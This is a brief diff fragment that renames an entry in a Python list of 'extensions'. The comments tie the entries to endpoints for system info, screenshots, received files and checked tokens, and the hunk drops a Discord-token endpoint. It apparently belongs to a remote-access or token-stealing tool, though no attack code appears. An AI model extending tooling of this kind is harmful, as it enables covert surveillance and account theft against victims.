@@ -184,7 +184,7 @@ extensions = (
     "systeminfo",     # /get_systeminfo
     "screenshot",     # /get_screenshot
     "receivefiles",   # /receivefiles
-    "checkedtokens"   # /checked_tokens & /checked_discord
+    "checkedTokens",    # /checked_tokens
 )
 
 for ex in extensions:
